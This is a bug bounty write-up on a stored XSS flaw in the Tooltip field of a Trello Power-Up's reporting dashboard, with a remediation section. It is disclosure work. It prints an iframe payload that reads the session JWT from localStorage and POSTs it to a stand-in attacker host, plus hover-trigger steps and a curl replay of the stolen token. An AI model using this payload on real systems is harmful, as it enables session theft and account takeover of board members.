---
title: "Trello: Stored XSS via Hippotrello plugin allow all members/admins Account TakeOver + JWT Theft"
date: 2026-10-09
categories: [Writeups, Web]
tags: [xss, stored-xss, trello, hipporello, jwt, ato, bugbounty, cookie-hijacking]
---

## Summary

The Hipporello Service Desk Power-Up for Trello fails to sanitize HTML in the **Tooltip** field of the "Add Text Widget" form (`admin.hipporello.com → Reporting → Add Widget → Text`). A board member can inject a stored XSS payload that executes in the browser of **any board member**, including admins, who simply hovers over the "?" icon next to the widget. No click required.

Because Hipporello stores sessions exclusively in `localStorage` (no HttpOnly cookie), every XSS on `admin.hipporello.com` results in full session theft. The stolen JWT grants authenticated access to the Hipporello API as the victim.

This is the **fourth independent stored XSS injection point** found in the same Power-Up, confirming a systemic absence of HTML sanitization across user-controlled fields.

> **Status:** Accepted, downgraded to P5 due to program rule (plugin requires +25K installs; Hipporello had +10K). Awarded 20 points × 4 reports. Vulnerability itself is P2 severity.

![severity p5](/Screenshot 2026-10-09 034945.png)
---

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Type** | Stored XSS → JWT Theft → ATO |
| **Location** | `admin.hipporello.com → Reporting → Add Widget → Text → Tooltip field` |
| **Trigger** | Mouseover on "?" icon (no click required) |
| **Suggested Severity** | P2 (High) |
| **Program Severity** | P5 (install count rule) |

---

## Vulnerable Field

**Path:** `admin.hipporello.com → Reporting → Add Widget → Text`   
**Field:** Tooltip

---

## Payloads

**Confirm XSS:**
```html
<iframe src="javascript:alert(document.domain)">
```

**Token exfiltration (ATO):**
```html
<iframe src="javascript:(async()=>{const cu=JSON.parse(localStorage.hippoUser||'{}');const t=cu.token||'';fetch('https://ATTACKER.oast.fun',{method:'POST',body:JSON.stringify({token:t,user:cu.user,domain:document.domain,url:location.href})})})()">
```

---

## Steps to Reproduce

**Precondition:** The target Trello board must have the [Hipporello Service Desk Power-Up](https://trello.com/power-ups/hipporello-service-desk) installed. The attacker needs any board role with access to the Reporting section.

**Step 1: Inject payload:**

Navigate to `admin.hipporello.com → Reporting → Add Widget → Text`.

In the "Add Text Widget" modal:
- **Title:** `Stored XSS` (any value)
- **Tooltip:** `<iframe src="javascript:alert(document.domain)">`
- **Text:** any value
![Text widget form](/trello3.png)

Click Save. The Tooltip is stored server-side unsanitized.
![Tooltip input field with payload](/trello4.png)

**Step 2: Trigger (hover only):**

Any board member who opens the Reporting section and hovers over the "?" icon next to the widget triggers the payload. The alert fires on `mouseover` alone, confirmed domain: `admin.hipporello.com`.
![XSS alert firing on hover](/trello1.png)

**Step 3: OOB callback received:**

Two HTTP POSTs arrived at the attacker's interactsh server within 2 seconds of hovering.

OOB server: d9s88d4oeu1c5fs8k6sggbzj9p875g1k6.oast.site
Source IP: 195.242.214.150
Origin: https://admin.hipporello.com
Time: 2026-08-09 13:51:45 UTC

![JWT and user data received at webhook](/trello2.png)
---

## Evidence

**Victim identity (`localStorage["hippoUser"]`):**
```json
{
  "name":           "account-2",
  "email":          "xxxxx@gmail.com",
  "trelloMemberId": "xxxxxxx",
  "role":           "admin",
  "portalUrl":      "https://storedxss.hipporello.net/desk",
  "boardId":        "xxxxx"
}
```

**Stolen JWT (decoded payload):**
```json
{
  "portrole": "admin",
  "portalId": "xxxxxxx",
  "boardId":  "xxxxxxxx",
  "plt":      "trello",
  "ticrole":  "admin"
}
```

Firebase token also received in the same request.

**ATO curl (using stolen token):**
```bash
curl -s "https://api.hipporello.com/v1/reporting" \
  -H "Authorization: [STOLEN JWT]" \
  -H "Origin: https://admin.hipporello.com"
```

**Cookies received:** analytics only (`_gcl_au`, `_ga`, `_hjSession*`), no HttpOnly session cookie. Hipporello session lives exclusively in `localStorage`, making the JWT the only session credential and fully exposed to any XSS.

---

## Impact

Full Account Takeover for every board member who hovers over the "?" icon on any Text widget in the Reporting section. The stolen JWT (`portrole: admin`, `ticrole: admin`) grants authenticated access to the Hipporello API as the victim.

Because Hipporello stores sessions exclusively in `localStorage` with no HttpOnly cookie, **every XSS on `admin.hipporello.com` achieves complete session theft by design.**

---

## Why P5 and Not P2?

The program rules require the Power-Up to have +25K installs. Hipporello had +10K at the time of submission. The vulnerability itself, stored XSS with no-click trigger, full JWT exfiltration, and confirmed admin ATO, is objectively P2 severity. The downgrade is purely a program policy decision, not a reflection of the actual risk.

The same root cause (missing HTML sanitization) was found in **four separate injection points** in the same Power-Up, all accepted individually.
![Triager comment](/Screenshot 2026-10-09 035122.png)
---

## Recommendation

- Apply consistent HTML output encoding on all user-controlled text fields in the Hipporello dashboard (Tooltip, Title, Text, and any other field rendered as HTML).
- Move session tokens from `localStorage` to HttpOnly cookies to limit the blast radius of any future XSS.
- Implement a Content Security Policy (CSP) on `admin.hipporello.com` to block inline script execution and restrict `fetch` origins.
